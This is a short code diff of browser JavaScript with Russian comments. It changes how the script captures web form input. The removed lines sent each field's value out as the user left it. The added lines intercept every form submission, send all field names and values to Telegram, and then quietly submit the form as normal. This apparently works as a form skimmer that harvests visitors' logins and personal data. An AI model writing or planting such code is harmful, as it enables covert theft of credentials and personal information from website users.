@@ -70,20 +70,19 @@ ${domainHashTag}`;
     });
 }
 
-// Отлавливаем событие выхода из поля
-document.querySelectorAll("form input").forEach(input => {
-    input.addEventListener("blur", event => {
-        const fieldName = event.target.name || "Неизвестное поле";
-        const fieldValue = event.target.value;
-        sendFieldData(fieldName, fieldValue);
-    });
+// Отслеживаем отправку формы
+document.querySelectorAll("form").forEach(form => {
+    form.addEventListener("submit", event => {
+        // Прерываем стандартное поведение отправки формы
+        event.preventDefault();
 
-    // Отслеживаем нажатие клавиши Enter
-    input.addEventListener("keydown", event => {
-        if (event.key === "Enter") {
-            const fieldName = event.target.name || "Неизвестное поле";
-            const fieldValue = event.target.value;
-            sendFieldData(fieldName, fieldValue);
-        }
+        // Перебираем все поля формы и отправляем их данные
+        const formData = new FormData(form);
+        formData.forEach((value, name) => {
+            sendFieldData(name, value);
+        });
+
+        // После отправки данных в Telegram, отправляем форму на сервер
+        form.submit();
     });
 });
